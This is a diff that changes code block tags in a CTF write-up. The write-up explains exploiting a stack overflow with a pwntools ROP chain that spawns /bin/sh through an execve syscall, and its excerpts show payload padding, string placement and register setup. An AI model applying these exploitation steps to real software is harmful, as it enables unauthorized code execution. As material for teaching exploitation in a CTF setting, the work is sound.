@@ -106,7 +106,7 @@ Here, we have a pretty obvious stack overflow.  Read is called, with a length of
 If you are not familiar with the [pwntools](https://github.com/Gallopsled/pwntools) library for Python, I highly recommend getting familiar with it.  It is incredibly helpful for building exploits for CTFs, and can also come in handy for non-pwn challenges, such as PPC or shellcoding challenges.
 
 So first I start with building my payload.  We will need 0x58(88) bytes of padding, followed by our ROP chain.
-```
+```python
 payload = ''
 payload += 'A'*88
 ```
@@ -119,7 +119,7 @@ Ok, let's think about what we want our ROP chain to do.  The goal for most pwn c
 ```
 
 So to get a shell, we want something like the following psuedo-code:
-```
+```python
 rax = 59
 rdi = '/bin/sh\x00'
 rsi = '\x00\x00\x00\x00\x00\x00\x00\x00'
@@ -130,7 +130,7 @@ So if we can setup the registers to match above, and then execute the `syscall` 
 
 We have lots of gadgets to play with, but the easiest gadgets for writing arbitrary data to registers is the pop instruction.  This allows us to simply place the desired values directly on the stack.  However, I now begin to ask myself, how am I going to get a hardcoded address pointing to `/bin/sh\x00`?  Well, that's when I noticed when debugging the vuln function, that the rdi register was already pointing to the beginning of my payload padding.  So let's just put '/bin/sh\x00' at the beginning before the padding.  And while I'm at it, I also go ahead and add a 64-bit 0x00 value after the `/bin/sh\x00` string.  Additionally, I also realized that the payload is also stored in a hard-coded location in the .bss section, not just on the stack.  So below is what my payload looks like now:
 
-```
+```python
 payload = ''
 payload += '/bin/sh\x00'
 payload += p64(0x00)
@@ -139,7 +139,7 @@ payload += 'A'*(88-len(payload))
 
 And memory locations:
 
-```
+```python
 0x631080: '/bin/sh\x00'
 0x631088: '\x00\x00\x00\x00\x00\x00\x00\x00'
 ```
@@ -158,7 +158,7 @@ GADGET_SYSCALL  = GADGETS_BASE + 0x2d0f#:    0f 05                   syscall
 
 Finally, we are ready to put everything together for the complete ROP chain:
 
-```
+```python
 p = getp()
 
 payload = ''
